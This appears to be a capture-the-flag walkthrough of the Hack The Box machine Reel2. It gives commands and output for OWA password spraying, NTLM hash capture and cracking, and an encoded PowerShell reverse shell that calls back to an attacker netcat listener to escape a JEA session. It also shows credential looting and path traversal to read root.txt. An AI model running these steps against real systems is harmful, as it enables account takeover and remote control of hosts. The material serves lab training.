### Build raw user list
##### written by AI
```javascript
http://10.129.220.109:8080/search?q=

const userFollowBoxes = document.querySelectorAll("table.user_follow_box");

const res = Array.from(userFollowBoxes)
  .filter(userblock => userblock.textContent.includes('@')) // Filter out userblocks without '@'
  .map(userblock => {
    const content = userblock.textContent.replace('@', '').trim();
    const endIndex = content.indexOf('\n');
    return endIndex !== -1 ? content.substring(0, endIndex) : content;
  });

console.log(res.join('\n'));
```

### Build proper userlist

```bash
git clone git@github.com:A1vinSmith/username-anarchy.git

./username-anarchy/username-anarchy --input-file raw_users --select-format f.last >> userlist
./username-anarchy/username-anarchy --input-file raw_users --select-format first.last >> userlist
./username-anarchy/username-anarchy --input-file raw_users --select-format l.first >> userlist

```

### OWA password spray
The first Reel was about Phishing, and there’s already OWA here, so that seems like a likely path.
```bash
feroxbuster -u http://10.129.220.109 --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

403      GET       29l       92w     1233c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        0l        0w        0c http://10.129.220.109/owa => http://10.129.220.109/owa/
```

```bash
trevorspray -m owa -u userlist -p Summer2020  --url https://10.129.220.109/owa
[INFO] Command: /home/kali/.local/bin/trevorspray -m owa -u userlist -p Summer2020 --url https://10.129.220.109/owa
[INFO] Spraying 78 users * 1 passwords against https://10.129.220.109/owa at Tue May  9 12:40:31 2023
[WARN] NOTE: OWA typically uses the INTERNAL username format! Often this is different than the email format.
[WARN] This means your --usernames file should probably contain INTERNAL usernames
[WARN] Depending on the OWA instance, the usernames may also need the domain like so: "CORP.LOCAL\USERNAME"
[WARN] You can discover the OWA's internal domain with --recon
[WARN] If this isn't what you want, consider spraying with the "msol" or "adfs" module instead.
[INFO] Using OWA URL: https://10.129.220.109/owa
[SUCC] Found internal domain via NTLM: "htb.local"
[SUCC] 
{
    "NetBIOS_Domain_Name": "HTB",
    "NetBIOS_Computer_Name": "REEL2",
    "DNS_Domain_name": "htb.local",
    "FQDN": "Reel2.htb.local",
    "DNS_Tree_Name": "htb.local"
}
```

Add the domain as prefix to user list and spray again
```bash
# written by AI
#!/bin/bash

# Read the username list text file and add "htb.local\" prefix to each line
while IFS= read -r username; do
	username=$(echo "${username}" | tr -d '\n\r\t ')  # Remove new lines, carriage returns, tabs, and spaces
	if [[ -n "${username}" ]]; then
	    modified_username="HTB.local\\${username}"
	    printf "%s\n" "${modified_username}" >> domain-userlist
	fi
done < userlist
```

```bash
trevorspray -m owa -u domain-userlist -p Summer2020 --url https://10.129.220.109/owa
```

Above should work but it doesn't.

Ruler worked after couple times attempt
```bash
/opt/ruler-linux64 --domain reel2.htb.local -k brute --users userlist --passwords passwords.txt --delay 0 --verbose
[+] Starting bruteforce
[+] Trying to Autodiscover domain
[+] 0 of 2 passwords checked
[x] Failed: g.quimbly:Summer2020
ERROR: 16:43:55 brute.go:193: An error occured in connection - Get "https://reel2.htb.local/autodiscover/autodiscover.xml": Get "https://reel2.htb.local/autodiscover/autodiscover.xml": net/http: request canceled
[x] Failed: j.moore:Summer2020
[x] Failed: t.trump:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: 
```

* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying#outlook-web-access
* https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/
* https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/
* https://github.com/sensepost/ruler/wiki/Brute-Force#brute-force-for-credentials
* https://github.com/dafthack/DomainPasswordSpray
* https://github.com/dafthack/MailSniper

### OWA logged in
`htb.local\s.svensson:Summer2020`
Set up responder to phish


```bash
sudo responder -I tun0

john svensson-hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst

(k.svensson)     
1g 0:00:00:00 DONE 2/3 (2023-05-09 17:15) 16.66g/s 561516p/s 561516c/s 561516C/s maryjane1..pepper1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

hashcat -m 5600 svensson-hash /usr/share/wordlists/rockyou.txt
```

### Bypass Invoke-Expression being disabled
```bash
evil-winrm -i $IP -u k.svensson -p kittycat1

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.    + CategoryInfo          : ObjectNotFound: (Invoke-Expression:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException>
```

```powershell
# powershell remoting via WinRM
$username = 'k.svensson'
$password = ConvertTo-SecureString "kittycat1" -AsPlainText -Force
$psCred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
Enter-PSSession -ComputerName reel2.htb.local -Credential $psCred

# list available command
Get-Command

```

```powershell
Enter-PSSession –ComputerName reel2.htb.local -Credential k.svensson  -Authentication Negotiate
# OR
$session = New-PSSession -ComputerName reel2.htb.local -Authentication Negotiat
e -Credential k.svensson
```

### With Powershell Remoting

To establish an authenticated remote PowerShell session using `Enter-PSSession`, you can use the `Authentication Negotiate` parameter. This ensures that the negotiation process is performed to determine the best authentication method.

If you encounter errors related to "Unspecified GSS failure," it might be necessary to install the `gss-ntlmssp` package. You can do this by running the command `apt install gss-ntlmssp` on your system.

```powershell
Enter-PSSession –ComputerName reel2.htb.local -Credential k.svensson  -Authentication Negotiate

PowerShell credential request
Enter your credentials.
Password for user k.svensson: *********

[reel2.htb.local]: PS>ls
The term 'ls' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct 
and try again.
    + CategoryInfo          : ObjectNotFound: (ls:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
+ 
```
### Escape JEA
* https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.3&viewFallbackFrom=powershell-7.1
* https://0xdf.gitlab.io/2021/03/13/htb-reel2.html#shell

```powershell
[reel2.htb.local]: PS>&{ get-location }

Path                         
----                         
C:\Users\k.svensson\Documents


[reel2.htb.local]: PS>&{ type ..\Desktop\user.txt}
1335452926bb66a2289efeff63a95c3c

[reel2.htb.local]: PS>&{ powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQA1ACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA }
```

```bash
sudo rlwrap -cAr nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.71.159] 36215
whoami
htb\k.svensson

PS C:\Users\k.svensson\Documents> $ExecutionContext.SessionState.LanguageMode
FullLanguage
```


### Privilege Escalation
```powershell
PS C:\Users\k.svensson\Documents> ls


    Directory: C:\Users\k.svensson\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/30/2020   5:14 PM                WindowsPowerShell                                                     
-a----        7/31/2020  11:58 AM           5600 jea_test_account.psrc <- JEA                                              
-a----        7/31/2020  11:58 AM           2564 jea_test_account.pssc <- JEA                                                 


PS C:\Users\k.svensson\Documents> Get-Process | where {$_.cpu}

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  
-------  ------    -----      -----     ------     --  -- -----------                                                  
     45       5     1556       3996       0.05   6224   0 conhost                                                      
   1060      56    27812      64764       2.06   5920   1 explorer                                                     
    492      24   115204     116172       1.34   1064   0 powershell                                                   
    250      29    38516      60316      45.09   1436   1 stickynotes                                                  
    337      29    20884      34332      46.11   5640   1 stickynotes                                                  
    471      37    26196      52500      62.64   5840   1 stickynotes                                                  
    169      11     2008       7296       0.25   5868   1 taskhostex                                                   
     61       6     1040       4096       0.02    624   1 vm3dservice                                                  
    161      17     3284      11300       1.17    728   1 vmtoolsd                                                     
    823      26    80504      93808       1.03   2492   0 wsmprovhost  

PS C:\Users\k.svensson\Documents> Get-Process -ID 1436 | select-object *


Name                       : stickynotes
Id                         : 1436
PriorityClass              : Normal
FileVersion                : 0.3.0
HandleCount                : 248
WorkingSet                 : 61530112
PagedMemorySize            : 39432192
PrivateMemorySize          : 39432192
VirtualMemorySize          : 363847680
TotalProcessorTime         : 00:00:46.0156250
SI                         : 1
Handles                    : 248
VM                         : 363847680
WS                         : 61530112
PM                         : 39432192
NPM                        : 29280
Path                       : C:\Users\k.svensson\AppData\Local\Programs\stickynotes\stickynotes.exe

PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> type 000003.log

{"first":"<p>Credentials for JEA</p><p>jea_test_account:Ab!Q@vcg^%@#1</p>"}
```

```powershell
PS C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb> nbtstat -n
    
Ethernet0 2:
Node IpAddress: [10.129.71.159] Scope Id: []

                NetBIOS Local Name Table

       Name               Type         Status
    ---------------------------------------------
    HTB            <00>  GROUP       Registered 
    REEL2          <00>  UNIQUE      Registered 
    HTB            <1C>  GROUP       Registered 
    REEL2          <20>  UNIQUE      Registered 
    HTB            <1B>  UNIQUE      Registered
```

```powershell
$pass = ConvertTo-SecureString 'Ab!Q@vcg^%@#1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\jea_test_account', $pass)
Enter-PSSession -Computer reel2.htb.local -credential $cred -Authentication Negotiate -ConfigurationName jea_test_account
```

```powershell
┌──(kali㉿kali)-[/home/kali]
└─PS> $pass = ConvertTo-SecureString 'Ab!Q@vcg^%@#1' -AsPlainText -Force

┌──(kali㉿kali)-[/home/kali]
└─PS> $cred = New-Object System.Management.Automation.PSCredential('htb\jea_test_account', $pass)

┌──(kali㉿kali)-[/home/kali]
└─PS> Enter-PSSession -Computer reel2.htb.local -credential $cred -Authentication Negotiate -ConfigurationName jea_test_account
[reel2.htb.local]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt                                                                                                           
b970f25bb602d3a17e1d6169b13c034b
```

### Reference
* https://ctf.rbct.it/HTB/machines/reel2/#root
* https://0xdf.gitlab.io/2021/03/15/reel2-root-shell.html#